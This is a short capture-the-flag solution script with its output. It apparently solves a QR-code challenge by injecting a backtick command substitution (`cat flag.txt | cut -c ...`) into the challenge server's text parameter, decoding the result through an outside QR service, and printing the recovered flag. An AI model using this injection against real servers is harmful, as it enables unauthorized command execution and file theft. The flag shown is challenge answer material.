```
wget -qc https://zxing.org/w/decode?u=http%3A%2F%2Fchalls.houseplant.riceteacatpanda.wtf%3A30004%2Fqr%3Ftext%3D%2560cat%2520flag.txt%2520%257C%2520cut%2520-c%2520{1..34}%2560
ls -rct decode\?u* | xargs cat | grep -o "Raw text[a-zA-Z0-9<>/_{}?]*<" | sed 's/Raw text<\/td><td><pre>//g' | sed 's/<\/pre><\/td><\/tr><tr><//g' | rev | cut -c 1- | rev | tr -d '\n'
```
```
$ bash decode.sh
rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}
```
